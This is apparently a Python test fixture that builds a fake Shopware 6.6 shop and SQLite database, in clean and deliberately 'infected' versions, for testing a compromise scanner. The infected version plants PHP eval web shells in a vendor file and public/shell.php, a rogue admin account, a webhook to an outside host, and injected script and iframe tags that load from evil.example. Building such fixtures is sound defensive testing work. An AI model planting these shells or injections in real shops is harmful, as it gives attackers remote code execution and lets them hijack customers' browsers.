"""Testwelt für Shopware (2.13.0): eine Shopware-6.6-Installation (Composer, vendor/shopware, custom/plugins, .env) und eine SQLite-Datenbank mit den Shopware-Tabellen.
Nicht dasselbe wie ein echter Shopware-Server (Tabellen- und Feldnamen von Hand nachgebaut)."""
import json
import os
import sqlite3
import time
from typing import Dict

from fixture import install_mysql_shim, w

SECRET = "s" * 64
ENV_GOOD = "APP_ENV=prod\nAPP_SECRET=%s\nAPP_URL=https://shop.example\nDATABASE_URL=mysql://sw_user:GEHEIM-DB-PASSWORT@127.0.0.1:3306/sw_db\nTRUSTED_HOSTS='^shop\\.example$'\n" % SECRET
ENV_BAD = "APP_ENV=dev\nAPP_DEBUG=1\nAPP_SECRET=kurz\nAPP_URL=http://shop.example\nDATABASE_URL=mysql://sw_user:GEHEIM-DB-PASSWORT@127.0.0.1:3306/sw_db\n"


def lock(version: str, plugin_version: str = "1.2.0") -> str:
    pk = [{"name": "shopware/core", "version": "v" + version, "type": "library", "dist": {"type": "zip", "reference": "abc"}},
          {"name": "shopware/administration", "version": "v" + version, "type": "library", "dist": {"type": "zip", "reference": "abd"}},
          {"name": "shopware/storefront", "version": "v" + version, "type": "library", "dist": {"type": "zip", "reference": "abe"}},
          {"name": "symfony/console", "version": "v6.4.1", "type": "library", "dist": {"type": "zip", "reference": "abf"}},
          {"name": "acme/fremd-plugin", "version": plugin_version, "type": "shopware-platform-plugin", "dist": {"type": "zip", "reference": "abg"}}]
    return json.dumps({"packages": pk, "packages-dev": []})


SCHEMA = """
CREATE TABLE user (id BLOB, username TEXT, admin INTEGER, active INTEGER, created_at TEXT, email TEXT, password TEXT);
CREATE TABLE integration (id BLOB, label TEXT, admin INTEGER, created_at TEXT, last_usage_at TEXT, access_key TEXT, secret_access_key TEXT);
CREATE TABLE webhook (id BLOB, name TEXT, event_name TEXT, url TEXT, active INTEGER);
CREATE TABLE sales_channel_domain (id BLOB, url TEXT);
CREATE TABLE cms_slot_translation (cms_slot_id BLOB, config TEXT);
CREATE TABLE product_translation (product_id BLOB, description TEXT);
CREATE TABLE category_translation (category_id BLOB, description TEXT);
CREATE TABLE snippet (id BLOB, value TEXT);
CREATE TABLE system_config (id BLOB, configuration_key TEXT, configuration_value TEXT);
"""


def build_site(root: str, infected: bool, version: str = "6.6.10.0") -> str:
    site = os.path.join(root, "html", "shop")
    os.makedirs(site, exist_ok=True)
    w(site + "/composer.lock", lock(version, "1.2.0"), days_ago=60)
    w(site + "/.env", ENV_BAD if infected else ENV_GOOD, days_ago=5 if infected else 90, mode=0o666 if infected else 0o600)
    w(site + "/config/jwt/private.pem", "-----BEGIN " + "PRIVATE KEY-----\nGEHEIM-JWT\n-----END " + "PRIVATE KEY-----\n", days_ago=90, mode=0o644 if infected else 0o600)
    for pkg in ("core", "administration", "storefront"):
        w(site + "/vendor/shopware/%s/composer.json" % pkg, "{}", days_ago=60)
        for i in range(40):
            w(site + "/vendor/shopware/%s/src/Teil%d.php" % (pkg, i), "<?php\n// %s %d\n" % (pkg, i), days_ago=60)
    w(site + "/public/index.php", "<?php\n// Shopware\n", days_ago=60)
    w(site + "/public/.htaccess", "Options -Indexes\n", days_ago=60)
    w(site + "/custom/plugins/FremdPlugin/composer.json", '{"name": "acme/fremd-plugin", "version": "1.2.0", "type": "shopware-platform-plugin"}', days_ago=60)
    w(site + "/custom/apps/MeineApp/manifest.xml", "<manifest><meta><name>MeineApp</name><version>2.0.1</version></meta></manifest>", days_ago=60)
    if infected:
        w(site + "/vendor/shopware/core/src/Backdoor.php", "<?php @eval(base64_decode($_GET['c']));", days_ago=2)
        w(site + "/public/shell.php", "<?php @eval($_POST['x']); ?>", days_ago=2)
    return site


def build_db(path: str, infected: bool) -> None:
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    now = time.time()

    def ts(days):
        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(now - days * 86400)) + ".123"
    c = con.cursor()
    c.execute("INSERT INTO user VALUES (1,'chef',1,1,?,'a@b.c','h')", (ts(900),))
    c.execute("INSERT INTO user VALUES (2,'redaktion',0,1,?,'a@b.c','h')", (ts(300),))
    c.execute("INSERT INTO sales_channel_domain VALUES (1,?)", ("http://shop.example" if infected else "https://shop.example",))
    c.execute("INSERT INTO cms_slot_translation VALUES (1,'{\"content\":{\"value\":\"<p>Hallo</p>\"}}')")
    c.execute("INSERT INTO snippet VALUES (1,'Warenkorb')")
    c.execute("INSERT INTO system_config VALUES (1,'core.basicInformation.shopName','Testshop')")
    if infected:
        c.execute("INSERT INTO user VALUES (3,'admin',1,1,?,'a@b.c','h')", (ts(2),))
        c.execute("INSERT INTO integration VALUES (1,'Kassensystem',1,?,NULL,'GEHEIM-ACCESS-KEY','GEHEIM-SECRET-KEY')", (ts(3),))
        c.execute("INSERT INTO webhook VALUES (1,'Hook','checkout.order.placed','http://fremd.example/hook',1)")
        c.execute("INSERT INTO cms_slot_translation VALUES (2,'{\"content\":\"<script>eval(atob(\\\"YWxlcnQoMSk=\\\"))</script>\"}')")
        c.execute("INSERT INTO product_translation VALUES (1,'<iframe src=\"https://evil.example/x\"></iframe>')")
        c.execute("INSERT INTO snippet VALUES (2,'<script src=\"https://evil.example/x.js\"></script>')")
    con.commit()
    con.close()


def make_shopware_world(base: str, infected: bool = True, version: str = "6.6.10.0") -> Dict[str, str]:
    tag = "sw_%s_%s" % ("infected" if infected else "clean", version.replace(".", "_"))
    home = os.path.join(base, tag, "home")
    os.makedirs(home, exist_ok=True)
    site = build_site(home, infected, version)
    dbp = os.path.join(base, tag, "test.sqlite")
    build_db(dbp, infected)
    bin_dir = install_mysql_shim(os.path.join(base, tag, "bin"), dbp)
    return {"home": home, "site": site, "site_rel": "html/shop", "db": dbp, "bin": bin_dir}
